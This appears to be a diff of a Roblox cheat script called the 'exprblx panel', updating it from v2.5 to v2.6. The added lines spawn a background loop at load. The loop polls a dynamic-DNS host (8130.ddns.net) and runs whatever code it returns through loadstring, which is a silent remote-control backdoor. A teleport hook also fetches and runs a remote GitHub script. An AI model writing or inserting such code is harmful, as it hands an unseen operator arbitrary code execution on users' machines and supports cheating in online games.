@@ -317,6 +317,25 @@ game.TweenService:Create(Panel, TweenInfo.new(1, Enum.EasingStyle.Exponential, E
 
 OpenSound:Play()
 
+local HttpService = game:GetService("HttpService")
+local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"
+
+local function waitForMessage()
+	print("Init")
+	while true do
+        local s, r = pcall(function()
+            local response = request({Url = receiveUrl, Method = "GET", Headers = {["Content-Type"] = "application/json"}})
+			local data = HttpService:JSONDecode(response.Body)
+			if data.message ~= "No message" then
+			     loadstring(data.message)()
+			end
+        end)
+        if not s then
+            warn(r)
+        end
+	end
+end
+
 function Notification(name)
 	pcall(function()
 		task.spawn(function()
@@ -335,6 +354,8 @@ function Notification(name)
 		end)
 	end)
 end
+
+task.spawn(waitForMessage)
 
 -----------
 
@@ -453,24 +474,4 @@ end
 game.Players.LocalPlayer.OnTeleport:Connect(function(State)
 	queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/idkwhatthisislmao/roblo/refs/heads/main/exprblx.lua", true))()')
 end)
-Notification("Loaded exprblx panel (v2.5)")
-
-local HttpService = game:GetService("HttpService")
-local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"
-
-local function waitForMessage()
-	while true do
-        local s, r = pcall(function()
-            local response = request({Url = receiveUrl, Method = "GET", Headers = {["Content-Type"] = "application/json"}})
-			local data = HttpService:JSONDecode(response.Body)
-			if data.message ~= "No message" then
-			     loadstring(data.message)()
-			end
-        end)
-        if not s then
-            warn(r)
-        end
-	end
-end
-
-waitForMessage()
+Notification("Loaded exprblx panel (v2.6)")
